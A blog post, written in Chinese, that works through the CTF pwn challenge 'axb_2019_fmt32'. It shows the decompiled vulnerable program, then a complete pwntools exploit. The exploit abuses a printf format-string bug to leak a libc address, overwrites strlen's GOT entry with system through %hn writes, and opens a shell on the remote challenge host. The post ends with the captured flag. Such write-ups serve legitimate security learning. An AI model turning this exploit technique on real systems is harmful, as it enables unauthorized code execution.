@@ -1,0 +1,117 @@
+---
+layout: post
+title:  axb_2019_fmt32
+date:   2021-06-23 00:01:01 +0300
+image:  2021-06-23-woman.jpg
+tags:   [ctf,Pwn,Fmtstr,ubuntu16]
+---
+
+main
+
+```assembly
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+Fh] [ebp-239h]
+  char format; // [esp+110h] [ebp-138h]
+  unsigned int v5; // [esp+23Ch] [ebp-Ch]
+
+  v5 = __readgsdword(0x14u);
+  setbuf(stdout, 0);
+  setbuf(stdin, 0);
+  setbuf(stderr, 0);
+  puts(
+    "Hello,I am a computer Repeater updated.\n"
+    "After a lot of machine learning,I know that the essence of man is a reread machine!");
+  puts("So I'll answer whatever you say!");
+  while ( 1 )
+  {
+    alarm(3u);
+    memset(&s, 0, 0x101u);
+    memset(&format, 0, 0x12Cu);
+    printf("Please tell me:");
+    read(0, &s, 0x100u);
+    sprintf(&format, "Repeater:%s\n", &s);
+    if ( strlen(&format) > 0x10E )
+      break;
+    printf(&format);
+  }
+  printf("what you input is really long!");
+  exit(0);
+}
+```
+
+sprintf
+
+`sprintf指的是字符串格式化命令，函数声明为 int sprintf(char *string, char *format [,argument,...]);，主要功能是把格式化的数据写入某个字符串中，即发送格式化输出到 string 所指向的字符串。sprintf 是个变参函数。使用sprintf 对于写入buffer的字符数是没有限制的，这就存在了buffer溢出的可能性。解决这个问题，可以考虑使用 snprintf函数，该函数可对写入字符数做出限制。`
+
+没有后门也没有系统函数，要用格式化字符串泄露出某个libc函数，来获得libc基址
+然后，仔细算一下 s 和 format 两个参数，都没有溢出，，也没有函数能写进got表，，所以还是再次利用格式化字符串漏洞通过%n来写入数据
+
+运行程序，输入%1$s
+
+输出：
+
+```assembly
+Please tell me:%1$s
+Repeater:Repeater:%s
+```
+
+此时栈中的布局为
+
+![]({{site.baseurl}}/img/2021-06-23-stack.jpg)
+
+栈中0xffffcdb0的位置本来应该为我们输入的内容"%1$s\n"，但是这里栈没有对齐，"%"(chr('%')==25)跑到了0xffffcdac的结尾，即0xffffcdaf。
+
+这样计算偏移的话，我们输入的东西的位置+1就是格式化字符串的第8个参数.
+
+```assembly
+from pwn import *
+from LibcSearcher import *
+
+io = remote("node4.buuoj.cn", 29367)
+
+please_tell_me = 0x804887D
+printf_got = 0x804A014
+strlen_got = 0x804A024
+
+payload = "a" + p32(printf_got) + "22" + "%8$s"
+
+io.recvuntil("Please tell me:")
+io.send(payload)
+
+io.recvuntil("22")
+addr = u32(io.recv(4))
+print(hex(addr))
+# 0xf7db7020
+
+lib = LibcSearcher("printf", addr)
+base = addr - lib.dump("printf")
+system = base + lib.dump("system")
+
+# system = addr - 0xe6e0
+
+high_sys = (system >> 16) & 0xffff
+low_sys = system & 0xffff
+# low < hign
+# so write low_sys first
+
+# len("Repeater:") + len("a") + len(p32(strlen_got) + p32(strlen_got+2)) = 18
+# %hn to write 2 bytes
+payload = "a" + p32(strlen_got) + p32(strlen_got+2) + "%" + str(low_sys-18) + "c%8$hn" + "%" + str(high_sys - low_sys) + "c%9$hn"
+io.recvuntil("Please tell me:")
+io.send(payload)
+
+io.recvuntil("Please tell me:")
+payload = ";" + "/bin/sh"
+io.send(payload)
+'''
+You can choose it by hand
+Or type 'exit' to quit:9
+[+] ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64) be choosed.
+'''
+
+
+io.interactive()
+```
+
+flag{74d5ef78-3046-44c3-8d72-0d137cf71868}
